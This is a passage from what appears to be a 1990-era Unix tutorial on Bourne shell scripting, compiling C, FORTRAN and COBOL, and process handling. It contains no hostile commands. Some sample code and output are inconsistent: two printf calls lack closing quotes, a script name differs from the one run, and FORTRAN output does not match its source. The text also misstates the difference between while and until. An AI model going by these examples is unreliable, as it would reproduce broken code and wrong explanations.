 Argument 4: 18:02:05                                          
                                                               
 Sep 12, 1990                                                  
 $                                                             

The first command in the BourneShell script dateset uses the grave
accent marks to set the command-line argument variables to the
output of the date command.  The next commands show the first four
of these argument variables.  The final command displays the
arguments in a different order that could be useful in a report or
a letter.

3.3  Comments in BourneShell Scripts

Comments can be inserted into the BourneShell script by beginning
each comment line with the pound symbol (#) or a colon (:).  All
characters after the comment character will be ignored by the
shell.  The only exception to this rule is that the first character
of the first line must not be a pound symbol; if the first
character is a pound sign, the BourneShell tries to execute the
script as if it was written in CShell syntax.

Sample Session:

 $cat com_sub                                                  
   #   The first line sets your present working directory      
 #     to the variable 'directory'                             
 directory=`pwd`                                               
 #     The second line sets the date to the variable 'when'    
 when=`date`                                                   
 :     The third line will echo on the screen                  
 echo "You are in $directory on $when"                         
 :     You could have said echo :                              
 :        "You are in `pwd` on `date`"                         
 :     to have a one line program                              
 $                                                             
                                                              
3.4  BourneShell Environment - Exporting Variables

Within a process, you can declare, initialize, read, and modify
variables.  The variable is local to that process.  When a process
forks a child process, the parent process does not automatically
pass the value of the variable to the child process.

Here is an example of the variables not being exported.

Sample Session:

 $cat no_export                                                
 car=mercedes       # set the variable                         
 echo $0 $car $$    # $0 = name of file executed               
                    	# $car =value of variable car              
                    	# $$ = PID number (process id)  inner              
		# execute another BourneShell script       
 echo $0 $car $$    # display same as above                    
 $cat inner                                                    
 echo $0 $car $$    # display variables for this process       
 $chmod a+x no_export                                          
 $chmod a+x inner                                              
 $no_export                                                    
 no_export mercedes 4790                                       
 inner 4792                                                    
 no_export mercedes 4790                                       
 $                                                             

When no_export was executed, it, of course, assigned a value of
mercedes to the variable car and printed it out.  The call to inner
created a child process.  Its PID is 4792, while the parent PID is
4790.  Notice, when inner tried to print the value of car, it
printed nothing.  The reason is because the value of car was not
passed by the parent.

Can the value be passed from parent to child process?  Yes, by
using the export command.  Let's look at an example.

Sample Session:

 $cat export_it                                                
 car=mercedes                                                  
 export car                                                    
 echo $0 $car $$                                               
 inner1                                                        
 echo $0 $car $$                                               
 $cat inner1                                                   
 echo $0 $car $$                                               
 car=chevy                                                     
 echo $0 $car $$                                               
 $chmod a+x export_it                                          
 $chmod a+x inner1                                             
 $export_it                                                    
 export_it mercedes 4798                                       
 inner1 mercedes 4800                                          
 inner1 chevy 4800                                             
 export_it mercedes 4798                                       
 $                                                             

In the export_it BourneShell script, the variable car was
initialized to mercedes; and then it was exported.  This means that
the value of car is now available to a child process.  When inner1
prints out the value of car it has the value of mercedes.  This is
as we expect because the value of car was exported from the parent. 
The next line of inner1 changes the value of car to chevy.  This
is shown in the next line of the sample session.  The last line of
the session shows the return to the parent process and the value
is still mercedes.  How is this possible? 

Exporting variables is only valid from the parent to the child
process.  The child process cannot change the parent's variable.

4.  CONTROL CONSTRUCTS:

The BourneShell control constructs can alter the flow of control
within the script.  The BourneShell provides simple two-way branch
if statements and multiple-branch case statements, plus for, while,
and until statements.

In discussing these control structures, the BourneShell keywords
will be in bold type and the normal type are the user supplied
items to cause the desired effect in command format boxes.

4.1  Types of Tests Used with Control Constructs:

The test utility evaluates expressions and returns a condition
indicating whether or not the expression is true (equal to zero)
or false (not equal to zero).  There are no options with this
utility.  The format for this utility is as follows:
                   
  Command Format:  test expression                             
  expression - composed of constants, variables, and operators                                       

Expressions will be looked at in greater detail later with some
examples.  There are a few items that need to be mentioned that
apply to expressions.  Expressions can contain one or more
evaluation criteria that test will evaluate.  A -a that separates
two criteria is a logical AND operator.  In this case, both
criteria must evaluate to true in order for test to return a value
of true.  The -o is the logical OR operator.  When this operator
separates two criteria, one or the other (or both) must be true for
test to return a true condition.

You can negate any criterion by preceding it with an exclamation
mark (!).  Parentheses can be used to group criteria.  If there
are no parentheses, the -a (logical AND operator) takes precedence
over the -o (logical OR operator).  The test utility will evaluate
operators of equal precedence from left to right.

Within the expression itself, you must put special characters, such
as parentheses, in quote marks so the BourneShell will not evaluate
them but will pass them to test.

Since each element (evaluation criterion, string, or variable) in
an expression is a separate argument, each must be separated by a
space.

The test utility will work from the command line but it is more
often used in a script to test input or verify access to a file.

Another way to do the test evaluation is to surround the expression
with left and right brackets. A space character must appear after
the left bracket and before the right bracket.

 test expression    =   [ expression ]

4.2  Test on Numeric Values

Test expressions can be in many different forms. The expressions
can appear as a set of evaluation criteria. The general form for
testing numeric values is:


          int1 op int2                                         

This criterion is true if the integer int1 has the specified
algebraic relationship to integer int2.

The valid operators (op) are:

    -eq       equal

    -ne       not equal

    -gt       greater than

    -lt       less than

    -ge       greater than or equal

    -le       less than or equal

4.3  Test on Character Strings

The evaluation criterion for character strings is similar to
numeric comparisons.  The general form is:

    string1 op string2

The operators (op) are:

    string1 = string2        
true if string1 and string 2 are equal

    string1 != string2       
true if string1 and string2 are not equal

    string1 true if string1 is not the null string

Sample Session:

 $ cat test_string                                             
 number=1                                                      
 numero=0001                                                   
 if test $number = $numero                                     
 then echo "String vals for $number and $numero are ="         
 else echo "String vals for $number and $numero not ="         
 fi                                                            
 if test $number -eq $numero                                   
 then echo "Numeric vals for $number and $numero are ="        
 else echo "Numeric vals for $number and $numero not ="        
 fi                                                            
 $chmod 755 test_string                                        
 $sh -x test_string                                            
 number=1                                                      
 numero=0001                                                   
 + test 1 = 0001                                               
 + echo String vals for 1 and 0001 not =                       
 String vals for 1 and 0001 not =                              
 + test 1 -eq 0001                                             
 + echo Numeric vals for 1 and 0001 are =                      
 Numeric  vals for 1 and 0001 are =                            
 $test_string                                                  
 String vals for 1 and 0001 not =                              
 Numeric vals for 1 and 0001 are =                             
 $                                                             

4.4  Test on File Types                                       


The test utility can be used to determine information about file
types.  All of the criterion can be found in Appendix B.  A few of
them are listed here:

    -r filename         true if filename exists and is readable

    -w filename         true if filename exists and is writable

    -x filename         true if filename exists and is executable

    -f filename         true if filename exists and it is a plain
                        file

    -d filename         true if filename exists and it is a
                        directory.

    -s filename         true if filename exits and it contains
                        information (has a size greater than 0
                        bytes)


Example:

 $test -d new_dir                                              

If new_dir is a directory, this criterion will evaluate to true. 
If it does not exist, then it will be false.
4.5  if then

The format for this construct is:


  Command Format:  if expression                               
                        then  commands                         
                   fi                                          


The if statement evaluates the expression and then returns control
based on this status.  The fi statement marks the end of the if,
notice that fi is if spelled backward.

The if statement executes the statements immediately following it
if the expression returns a true status. If the return status is
false, control will transfer to the statement following the fi.

Sample Session:

 $cat check_args                                               
 if (test $# = 0)                                              
      then echo 'Please supply at least 1 argument'            
      exit                                                     
 fi                                                            
 echo 'Program is running'                                     
 $                                                             

This little script will check to insure that you are giving at
least one argument.  If none are given it will display the error
message and exit.  If one or more arguments are given it will
display "Program is running" and run the rest of the script, if
any.

Sample Session:

 $check_args                                                   
 Please supply at least 1 argument                             
 $check_args xyz                                               
 Program is running                                            
 $                                                             

4.6  if then else


The format for this construct is:

  Command Format:  if expression                               
                        then commands                          
                        else commands                          
                   fi                                          

The else part of this structure makes the single-branch if
statement into a two-way branch.  If the expression returns a true
status, the commands between the then and the else statement will
be executed.  After these have been executed, control will start
again at the statement after the fi.

If the expression returns false, the commands following the else
statement will be executed.
Sample Session:

 $cat test_string                                              
 number=1                                                      
 numero=0001                                                   
 if test $number = $numero                                     
 then echo "String values of $number and $numero are equal"    
 else echo "String values of $number and $numero not equal"    
 fi                                                            
 if test $number -eq $numero                                   
 then echo "Numeric values of $number and $numero are equal"   
 else echo "Numeric values of $number and $numero not equal"   
 fi                                                            
                                                                
Let's follow the execution of this script with tracing.

Sample Session:

 $sh -x test_string                                            
 number=1                                                      
 numero=0001                                                   
 + test 1 = 0001                                               
 + echo String values of 1 and 0001 are not equal              
 String values of 1 and 0001 are not equal                     
 + test 1 -eq 0001                                             
 + echo Numeric values of 1 and 0001 are equal                 
 Numeric values of 1 and 0001 are equal                        
 $chmod a+x test_string                                        
 $test_string                                                  
 String values of 1 and 0001 are not equal                     
 Numeric values of 1 and 0001 are equal                        
 $                                                             

4.7  if then elif


The format for this construct is:

  Command Format:  if expression                               
                        then commands                          
                     elif expression                           
                            then commands                      
                            else commands                      
                   fi                                          

The elif construct combines the else and if statements and allows
you to construct a nested set of if then else structures.
4.8  for


The format for this construct is:

  Command Format:  for loop-index in argument-list             
                        do                                     
                        commands                               
                        done                                   

This structure will assign the value of the first item in the
argument list to the loop index and executes the commands between
the do and done statements.  The do and done statements indicate
the beginning and end of the for loop.

After the structure passes control to the done statement, it
assigns the value of the second item in the argument list to the
loop index and repeats the commands.  The structure will repeat
the commands between the do and done statements once for each
argument in the argument list.  When the argument list has been
exhausted, control passes to the statement following the done.


Sample Session:

 $cat find_henry1                                              
 for x in project1 project2 project3                           
 do                                                            
 grep henry $x                                                 
 done                                                          

Sample Session:

 $head project?                                                
 ==> project1 <==                                              
 henry                                                         
 joe                                                           
 mike                                                          
 sue                                                           
                                                               
 ==> project2 <==                                              
 joe                                                           
 mike                                                          
 sue                                                           
                                                               
 ==> project3 <==                                              
 joe                                                           
 mike                                                          
 sue                                                           
 henry                                                         
                                                               
 ==> project4 <==                                              
 joe                                                           
 mike                                                          
                                                               
 $find_henry                                                   
 henry                                                         
 henry                                                         
 $                                                             


Each file in the argument list was searched for the string, henry.
When a match was found, the string was printed.

4.9  while

The format for this construct is:

  Command Format:  while expression                            
                        do                                     
                        commands                               
                        done                                   

As long as the expression returns a true exit status, the structure
continues to execute the commands between the do and the done
statement.  Before each loop through the commands, the structure
executes the expression.  When the exit status of the expression
is false (non-zero), control is passed to the statement following
the done statement.
The commands to be executed must change the expression test or an
infinite loop can result.

4.10  until

The format for this construct is:

  Command Format:  until expression                            
                        do                                     
                        commands                               
                        done                                   

The until and while structures are very similar.  The only
difference is that the test is at the top of the loop.  The until
structure will continue to loop until the expression returns true
or a nonerror condition.  The while loop will continue as long as
a true or nonerror condition is returned.

The commands to be executed must change the expression test or an
infinite loop can result.
Sample Session:

 $cat until_ex                                                 
 secretname='jenny'                                            
 name='noname'                                                 
 echo 'Try to guess the secret name!'                          
 echo                                                          
 until (test "$name" = "$secretname")                          
     do                                                        
     echo 'Your guess:  \c'                                    
     read name                                                 
     done                                                      
 echo 'You did it!'                                            
 $                                                             

The until loop will continue until name is equal to the secret
name.

Sample Session:

 $chmod a+x until_ex                                           
 $until_ex                                                     
 Try to guess the secret name!                                 
                                                               
 Your guess: gaylan                                            
 Your guess: art                                               
 Your guess: richard                                           
 Your guess: jenny                                             
 You did it!                                                   
 $                                                             

4.11  case

The format for this construct is:

  Command Format:  case test-string in                         
                        pattern-1 ) commands-1 ;;              
                        pattern-2 ) commands-2 ;;              
                        pattern-3 ) commands-3 ;;              
                        .                                      
                        .                                      
                        .                                      
                        *)          commands   ;;              
                   esac                                        

The case structure allows a multiple-branch decision mechanism.
The path that is taken depends on a match between the test-string
and one of the patterns.
Sample Session:
                                                 
 $cat case_ex                                                  
 echo 'Enter A, B, or C: \c'                                   
 read letter                                                   
 case $letter in                                               
    A) echo 'You entered A' ;;                                 
    B) echo 'You entered B' ;;                                 
    C) echo 'You entered C' ;;                                 
    *) echo 'You did not enter A, B, or C' ;;                  
 esac                                                          
 $chmod a+x case_ex                                            
 $case_ex                                                      
 Enter A, B, or C: B                                           
 You entered B                                                 
 $case_ex                                                      
 Enter A, B, or C: b                                           
 You did not enter A, B, or C                                  
 $                                                             

This example uses the value of a character that the user entered
as the test string.  The value is represented by the variable
letter.  If letter has the value of A, the structure will execute
the command following A.  If letter has a value of B or C, then
the appropriate commands will be executed.  The asterisk indicates
any string of characters; and it, therefore, functions as a
catchall for a no-match condition.  The lowercase b in the second
sample session is an example of a no match condition.

5. COMPILING PROGRAMS IN UNIX

This chapter will examine compiling source code programs in three
high level languages "C", FORTRAN, and COBOL. The second part of
the chapter will look at the archive and library maintainer. The
archive allows you to create a library of object modules. These
files are used by the link editor.

5.1  "C": Sample Program with a Main and Two Functions in One File

Based on the command line options, cc compiles, assembles, and load
C language source code programs.  It can also assemble and load
assembly language source programs or merely load object programs.

  Command Format:  cc [options] file-list                      
  (See Appendix E for a complete list of options)              

When using the cc utility, the following conventions are observed:

    1.   A filename with the extension of .c indicates a C
         language source program.

    2.   A filename with an extension of .s indicates an assembly
         language source program.

    3.   A filename with an extension of .o indicates an object
         program.

The cc utility will take its input from the file or files you
specify on the command line.  Unless you use the -o option, it will
store the executable program in a file called a.out.
Sample C Language Source Code Program:
                          
 $cat hello.c                                                  
 main ()                                                       
 {                                                             
      printf ("Hello from main!\n\n");                         
      printf ("Calling function1!\n\n");                       
      funct1();                                                
      printf ("\t Back from function1!\n\n");                  
      printf ("Calling function2!\n\n");                       
      funct2();                                                
      printf ("\t Back from funct2!\n\n");                     
      printf ("That's all!\n\n");                              
 }                                                             
 funct1()                                                      
 {                                                             
      printf ("\t\t Hello from function1!\n\n);                
 }                                                             
 funct2()                                                      
 {                                                             
      printf ("\t\t Hello from function2!\n\n);                
 }                                                             

5.2  "C": Compiling a Program


To compile the previous example program into an executable module,
enter the following command at the command line.

Sample Session:

 $cc hello.c                                                   
 $                                                             

Without any options, cc accepts C source code and assembly language
programs that follow the conventions outlined above.  It will
compile, assemble, and load these programs to produce an executable
called a.out.  The cc utility puts the object code in files with
the same base filename (everything before the period) as the source
but with a filename extension of .o .  The a.out stands for
assembly output.  This is the default.

Sample Session:

 $cc hello.c                                                   
 $a.out                                                        
 Hello from main!                                              
                                                               
 Calling function1!                                            
                                                               
                Hello from function1!                          
                                                               
           Back from function1!                                
                                                               
 Calling function2!                                            
                                                               
                Hello from function2!                          
                                                               
           Back from function2!                                
                                                               
 That's all!                                                   
 $                                                             

NOTE:     The a.out file that was created by the cc utility has
         the following permissions:

         user - read, write, and execute 
         group - read and execute
         other - read and execute


It is not necessary for you to change the permissions using the
chmod command because the cc utility set the execute permissions
for you.

5.3  "C": Renaming the Executable Module

You can rename the executable module using the mv command.  The
file permissions will be the same as before the file is renamed.

Sample Session:

 $mv a.out hello                                               
 $hello                                                        
 Hello from main!                                              
                                                               
 Calling function1!                                            
                                                               
                Hello from function1!                          
                                                               
           Back from function1!                                
                                                               
 Calling function2!                                            
                                                               
                Hello from function2!                          
                                                               
           Back from function2!                                
                                                               
 That's all!                                                   
 $                                                             

5.4  "C": Giving a Name to the Output File

It is possible to have the output sent to a file you specify
instead of a.out by using the following command:

  Command Format:  cc -o output source                         
                                                               
  output - the name of the executable file                     
                                                               
  source - the name of the C source code file                  
                                                               
The -o option tells cc to tell the link editor to use the specified
name for the output instead of the default a.out.

NOTE:     It is not necessary for the -o option to appear after the
         cc command.  The filename that appears after the -o is
         the name of the output file.  For example, cc source -
         o output is the same as cc -o output source.

Sample Session:

 $cc -o hello hello.c                                          
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
                                                               
                Hello from function1!                          
                                                               
           Back from function1!                                
                                                               
 Calling function2!                                            
                                                               
                Hello from function2!                          
                                                               
           Back from function2!                                
                                                               
 That's all!                                                   
 $                                                             

5.5  "C": Producing an Assembly Listing

This option causes cc to compile C programs and leave the
corresponding assembly language source programs in a file with
filename extensions of .s.

  Command Format:  cc -S hello.c                               
                                                               
  -S = Compile only                                            

Sample Session:

 $cc -S  hello.c                                               
 $ls -C                                                        
 example.f    hello     hex.c     octal.c                      
 hello.c      hello.s   multiply.c                             
 $                                                             

5.6  "C": Main and Two Functions in Three Separate Source Files

This is the same C program that we have seen before, except it is
now in three files rather than one as before.  The three files are
main.c, funct1.c, and funct2.c.

 $cat main.c                                                   
 main ()                                                       
 {                                                             
      printf ("Hello from main!\n\n");                         
      printf ("Calling function1!\n\n");                       
      funct1();                                                
      printf ("\t Back from function1!\n\n");                  
      printf ("Calling function2!\n\n");                       
      funct2();                                                
      printf ("\t Back from funct2!\n\n");                     
      printf ("That's all!\n\n");                              
 }                                                             
 $cat funct1.c                                                 
 funct1()                                                      
 {                                                             
      printf ("\t\t Hello from function1!\n\n);                
 }                                                             
 $cat funct2.c                                                 
 funct2()                                                      
 {                                                             
      printf ("\t\t Hello from function2!\n\n);                
 }                                                             

5.7  "C": Compiling but Not Producing an Executable Module

Using the previous program, the following command will compile but
not produce an executable module.

     Command Format:     cc -c main.c funct1.c funct2.c        
                                                               
     -c = Compile, but do not load object files.  This option  
          causes cc to compile and/or assemble source code     
          programs and leave the corresponding object programs 
          in files with filename extensions of .o.             

Sample Session:

 $cc -c main.c funct1.c funct2.c                               
 main.c:                                                       
 funct1.c:                                                     
 funct2.c:                                                     
 $ls a.out                                                     
 a.out not found                                               
 $ls -C *.o                                                    
 funct1.o           funct2.o          main.o                   
 $                                                             

The -c options causes the compilation system to suppress the link
edit phase.  This produces an object file or files, in this example
(main.o funct1.o funct2.o), that can be link edited at a later time
with the cc command with no options.

5.8  FORTRAN: Sample Program a Main and Two Subroutines

There are several conventions for use with the FORTRAN compiler.
They are:

    1.   The name of the file containing the FORTRAN source code
         must end with .f.

    2.   The compiler is invoked with f77.

    3.   Several options are available with the compiler.
         (-c, -o, -p, -S)

    4.   Preconnections are made for stdin (unit5) and stdout
         (unit6).

This is the FORTRAN source code example to be used in the following
discussions of the FORTRAN compiler.

Sample Session:

 $cat hello.f                                                  
       program calling                                         
       write(6,100)                                            
 100   format (' Hello from main!',/)                          
       write(6,110)                                            
 110   format(' Calling subroutine1!',/)                       
       call sub1                                               
       write(6,120)                                            
 120   format(t15' Back from subroutine1!',/)                  
       write(6,130)                                            
 130   format(' Calling subroutine2!',/)                       
       call sub2                                               
       write(6,140)                                            
 140   format(t15' Back from subroutine2!',/)                  
       write(6,150)                                            
 150   format(' That's all, folks!')                           
       end                                                     
       subroutine sub1                                         
       write(6,200)                                            
 200   format(t20,' Hello from subroutine1!',/)                
       end                                                     
       subroutine sub2                                         
       write(6,210)                                            
 210   format(t20,' Hello from subroutine2!',/)                
       end                                                     

5.9  FORTRAN: Compiling a Program

The FORTRAN compiler is invoked with the following command:

  Command Format:  f77                                         

To compile the above program into an executable program, use the
following command at the command line.

Sample Session:

 $f77 hello.f                                                  
 $                                                             

Without any options, f77 accepts FORTRAN source code and assembly
language programs that follow the conventions outlined above.  It
will compile, assemble, and load these programs to produce an
executable called a.out.  The f77 utility outputs the object code
into files with the same base filename (everything before the
period) as the source but with a filename extension of .o.
The a.out stands for assembly output.  This is the default.

Sample Session:

 $f77 hello.f                                                  
 $a.out                                                        
 Hello from main!                                              
                                                               
 Calling function1!                                            
                                                               
              Hello from function1!                            
                                                               
         Back from function1!                                  
                                                               
 Calling function2!                                            
                                                               
              Hello from function2!                            
                                                               
         Back from function2!                                  
                                                               
 That's all!                                                   
 $                                                             

NOTE:     The a.out file that was created by the f77 utility has
         the following permissions:

         user - read, write, and execute 
         group - read and execute
         other - read and execute

It is not necessary for you to change the permissions using the
chmod command because the f77 utility set the execute permissions
for you.

5.10  FORTRAN: Renaming the Executable Module

You can rename the executable module using the mv command.  The
file permissions will be the same as before the file is renamed.

Sample Session:

 $mv a.out hello                                               
 $hello                                                        
 Hello from main!                                              
                                                               
 Calling function1!                                            
                                                               
              Hello from function1!                            
                                                               
         Back from function1!                                  
                                                               
 Calling function2!                                            
                                                               
              Hello from function2!                            
                                                               
         Back from function2!                                  
                                                               
 That's all!                                                   
 $                                                             

5.11  FORTRAN: Giving a Name to the Output File

It is possible to have the output sent to a file you specify
instead of the default, a.out, by using the following command:

  Command Format:  f77 -o output source                        
                                                               
  output - the name of the executable file                     
                                                               
  source - the name of the Fortran source code file            

The -o option tells the f77 utility to tell the link editor to use
the specified name for the output instead of the default a.out.

NOTE:     It is not necessary for the -o option to appear after
         the f77 command.  The filename that appears after the -
         o is the name of the output file.  For example, f77
         source -o output is the same as f77 -o output source.

Sample Session:

 $f77 -o hello hello.f                                         
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
                                                               
              Hello from function1!                            
                                                               
         Back from function1!                                  
                                                               
 Calling function2!                                            
                                                               
              Hello from function2!                            
                                                               
         Back from function2!                                  
                                                               
 That's all!                                                   
 $                                                             

5.12  FORTRAN: Producing an Assembly Listing

This option causes f77 to compile Fortran programs and leave the
corresponding assembly language source programs in a file with
filename extensions of .s.

  Command Format:  f77 -S hello.f                              
                                                               
  -S = Compile only                                            

Sample Session:

 $f77 -S  hello.f                                              
 $ls -C                                                        
 example.f         hello     hex.c     octal.c                 
 hello.c           hello.s   multiply.c                        
 $                                                             

The file hello.s contains the assembly listing.

5.13  FORTRAN: Main and Two Subroutines in Three Separate Source Files

Sample Session:

 $cat main.f                                                   
      program calling                                          
      write(6,100)                                             
 100  format (' Hello from main!',/)                           
      write(6,110)                                             
 110  format(' Calling subroutine1!',/)                        
      call sub1                                                
      write(6,120)                                             
 120  format(t15' Back from subroutine1!',/)                   
      write(6,130)                                             
 130  format(' Calling subroutine2!',/)                        
      call sub2                                                
      write(6,140)                                             
 140  format(t15' Back from subroutine2!',/)                   
      write(6,150)                                             
 150  format(' That's all, folks!')                            
      end                                                      
 $cat sub1.f                                                   
      subroutine sub1                                          
      write(6,200)                                             
 200  format(t20,' Hello from subroutine1!',/)                 
      end                                                      
 $cat sub2.f                                                   
      subroutine sub2                                          
      write(6,210)                                             
 210  format(t20,' Hello from subroutine2!',/)                 
      end                                                      

5.14  FORTRAN: Compiling But Not Producing an Executable Module

Using the above program, the following command will compile but
not produce an executable module.

  Command Format:  f77 -c main.f sub1.f sub2.f                 
                                                               
  -c = Compile, but do not load object files.  This option     
       causes f77 to compile and/or assemble source code       
       programs and leave the corresponding object programs    
       in files with filename extensions of .o.                

Sample Session:

 $f77 -c main.f sub1.f sub2.f                                  
 main.f:                                                       
      MAIN: calling:                                           
 sub1.f:                                                       
      sub1:                                                    
 sub2.f:                                                       
      sub2:                                                    
 $ls a.out *.o                                                 
 a.out not found                                               
 funct1.o                                                      
 funct2.o                                                      
 hello.o                                                       
 main.o                                                        
 sub1.o                                                        
 sub2.o                                                        
 $                                                             

The -c options causes the compilation system to suppress the link
edit phase.  This produces an object file or files, in this example
(main.o sub1.o sub2.o), that can be link edited at a later time
with the f77 command with no options.
5.15  FORTRAN: Compiling Object Files to Produce an Executable   
              Module

The command to produce an executable nodule from several object
files is done in the following manner:

  Command Format:  f77 obj_1 obj_2 obj_3                       
                                                               
  obj_1 through obj_n - the object files                       

Sample Session:

 $f77 main.o sub1.o sub2.o                                     
 $ls -C                                                        
 funct1.o funct2.o hello.o main.o sub1.o sub2.o a.out          
 $                                                             

5.16  COBOL: Sample Program with a Main and Two Subroutines

Sample Session:

 $cat teacher.cob                                              
 identification division.                                      
 program-id. teacher.                                          
 environment division.                                         
 configuration section.                                        
 data division.                                                
 working-storage section.                                      
 procedure division.                                           
 begin section.                                                
 begin-it.                                                     
      display " Hello from main!".                             
      display "  Calling subroutine1!".                        
      perform subroutine1.                                     
      display "               Back from subroutine1!".         
      display "  Calling subroutine2!".                        
      perform subroutine2.                                     
      display "               Back from subroutine2!".         
      display "  That's all, folks!".                          
      stop run.                                                
 subroutine1 section.                                          
 sub1.                                                         
      display "               Hello from subroutine1!".        
 subroutine2 section.                                          
 sub2.                                                         
      display "               Hello from subroutine2!".        

5.17  COBOL: Compiling a Program

  Command Format:  cobol source_filename                       

Three files are created by the compiler.  They are identified by
the same filename as the source code but with a different
extension.  They have the extensions .IDY, .INT, and .LST.

NOTE:     The extensions are uppercase characters.  UNIX is case 
         sensitive.

Sample Session:

 $cobol teacher.cob                                            
 $ls teacher*                                                  
 teacher.IDY                                                   
 teacher.INT                                                   
 teacher.LST                                                   
 teacher.cob                                                   
 $                                                             

5.18  COBOL: Running a Program


 $cbrun teacher.INT                                            
 Hello from Main!                                              
   Calling subroutine1!                                        
               Hello from subroutine1!                         
              Back from subroutine1!                           
   Calling subroutine2!                                        
               Hello from subroutine2!                         
              Back from subroutine2!                           
 That's all, folks!                                            
 $
+++++++++++++++++++++

0010	Unix for Intermediate Users Part 1

1.  THE FILE CALLED .profile AND PROCESSES
       1.1  HOME
       1.2  PATH
       1.3  INGRES Environment Variables
       1.4  ING_HOME
       1.5  TERM_INGRES
       1.6  ING_EDIT
       1.7  Processes
       1.8  Executing a Command
       1.9  Process Identification
       1.10  Interrupt Handling

2. COMPILING "C" PROGRAMS
       2.1  "C": Sample Program with a Main and Two Functions in One        
       2.2  "C": Compiling a Program
       2.3  "C": Renaming the Executable Module
       2.4  "C": Giving a Name to the Output File
       2.5  "C": Producing an Assembly Listing
       2.6  "C": Main and Two Functions in Three Separate Source Files
       2.7  "C": Compiling but Not Producing an Executable Module

3.  COMPILING FORTRAN  PROGRAMS
       3.1  FORTRAN: Sample Program a Main and Two Subroutines
       3.2  FORTRAN: Compiling a Program
       3.3  FORTRAN: Renaming the Executable Module
       3.4  FORTRAN: Giving a Name to the Output File
       3.5  FORTRAN: Producing an Assembly Listing
       3.6  FORTRAN: Main and Two Subroutines in Three Separate Source Files
       3.7  FORTRAN: Compiling But Not Producing an Executable Module
       3.8  FORTRAN: Compiling Object Files to Produce an Executable Module

4.  COMPILING COBOL PROGRAMS
       4.1  COBOL: Sample Program with a Main and Two Subroutines
       4.2  COBOL: Compiling a Program
       4.3  COBOL: Running a Program

5.  UNIX TOOLS
       5.1  The make Utility p: A Pattern Matching Filter
              5.2.1  More on Regular Expressions
              5.2.2  Closure
              5.2.3  Some Nice grep Options             
              5.2.4  Summary of Regular Expression Characters
       5.3  sed: Edit a File to Standard Output
       5.4  awk: A Pattern Matching Programming Language
       5.5  sort: Sort a File
       5.6  Archiver and Library Maintainer
       5.7  Creating an Archive File with Object Modules
       5.8  Verifying the Contents of the Archive File
       5.9  Removing Duplicate Object Files
       5.10  Compiling Main and Archive Files


1.  UNIX PROCESSES AND A FILE CALLED .profile

1.1  Processes

A process is the execution of a command by UNIX.  Processes 
can also be executed by the operating system itself.  Like the file 
structure, the process structure is hierarchical.  It contains parents, 
children, and even a root.  A parent can fork (or spawn) a child 
process.  That child can, in turn, fork other processes. The first thing 
the operating system does to begin execution is to create a single 
process, PID number 1.  PID stands for Process Identification.  This 
process will hold the same position as the root directory in the file 
structure.  This process is the ancestor to all processes that each 
user works with.  It forks a process for each terminal.  Each one of 
these processes becomes a Shell process when the user logs in.

1.2  Process Identification

The UNIX operating system assigns a unique process identification 
number (PID) to each process.  It will keep the same PID as long as the 
process is in existence.  During one session, the same process is always 
executing the login Shell.  When you execute another command, a new 
process is forked and a new PID is assigned to that process.  When that 
child process is finished, you are returned to the login process, which is 
running the Shell, and that parent process has the same PID as when you 
logged in.

The Shell stores the PID in Shell variable called $$.  The PID can also be 
shown with the process status (ps) command.  The format for ps is as follows:

    Command Format:  ps [options]                              
                                                               
    See on-line manual for options                             
With no options given the ps command will give you certain information about 
processes associated with the controlling terminal.  The output consists of a 
short listing containing the process id, terminal id, cumulative execution time, 
and the command name.  Otherwise, options will control the display.

Sample session:

 $echo $$                                                                   
 8347                                                                       
 $ps                                                                        
 PID 		TTY      	TIME	COMMAND                                               
 8347 	rt021a0  	0:03 		ksh                                        
 8376 	rt021a0  	0:06 		ps                                           
$                                                                          
 
The PID numbers of the Shell are the same in the sample session because the Shell will substitute its own PID number for $$.  The Shell makes the substitution before it forks a new process to execute the echo command.  Therefore, echo will display the PID number of the process that called it, not the PID of the process that is executing it.

The -l option will display more information about the processes.

Sample Session: 

 $ps -l                                                                                   
FS	UID	PID	PPID	C	PRI	NI	ADDR	SZ	WCHAN	TTY	TIME	COMD	
f0000	S	115	8347	309	2  30	20	1009000	140	94014	rt021a0	0:03	ksh	
f0000  	O	115	8386	16	68	20	1308000	72		rt021a0	0:01	ps	

 $ps -l                                                                                   
FS	UID	PID	PPID	C	PRI	NI	ADDR	SZ	WCHAN	TTY	TIME	COMD	
f0000	S	115	8347	309	1 30	20	1009000	140	94014	rt021a0	0:03	ksh	
f0000  	O	115	8387	26	73	20	1146000	72		rt021a0	0:01	ps	

 $                                                                                        

1.3  Executing a Command

When you give a command to the Shell, it will fork a process to execute the command.  While the child process is executing the command, the parent will go to sleep.  Sleeping means that the process will not use any CPU time.  It remains inactive until it is awakened.  When the child process has finished executing the command, it dies.  The parent process, which is running the Shell, wakes up and prompts you for another command.  

When you request a process to run in the background (by ending the command line with an ampersand character (&), the Shell forks a child process that is allowed to run to completion.  The parent process will report the PID of the child process and then prompt you for another command.  The child and parent are now independent processes.

1.4  The . (dot) and exec Commands

There are two ways to execute a program without forking a new process. The . (dot) command will execute the script as part of the current process.  When the new script has finished executing, the current process will continue to execute the original script.  The exec command will execute the new script in place of (overlays) the original script and never returns to the original script.

The . (dot) command will not execute compiled files (binary) and it does 
not require execute permission on the script file that is being executed. 
The exec command does require access permission to either a binary 
program or a shell script.

Sample session:

    $ls -l prog2                                               
    -rw-r--r--  1 teacher  class   22 Jan 18 10:30 prog2       
    $cat prog2                                                 
    echo 'prog2 PID =' $$                                      
    $cat dot_example                                           
    echo $0 'PID=' $$                                          
    . prog2                                                    
    echo 'This line is executed'                               
    $dot_example                                               
    dot_example PID= 6942                                      
    prog2 PID = 6942                                           
    This line is executed                                      
    $                                                          

The exec command will overlay the sh and control will never return to 
the calling script.  

Let's look at another example with a call to prog2 using exec instead of . (dot):

Sample session:

    $ls -l prog2                                               
    -rwxr-xr-x  1 teacher  class   22 Jan 18 10:30 prog2       
    $cat prog2                                                 
    echo 'prog2 PID =' $$                                      
    $cat exec_example                                          
    echo $0 'PID=' $$                                          
    exec prog2                                                 
    echo 'This line is never executed'                         
    $exec_example                                              
    exec_example PID= 6950                                     
    prog2 PID = 6950                                           
    $                                                          
                                                               
Background Processing

When a program is running in background you do not have to wait for it to finish before starting another program. This is useful because you can start long/large jobs and then continue to do another task on your terminal.

To run a program in background simply type an ampersand character (&) at the end of the command line before the (Ret) key. The Shell will return the PID of the background process and then give you another system prompt.

Sample session:

    $ls -l | lp &                                              
    [1]     21334                                              
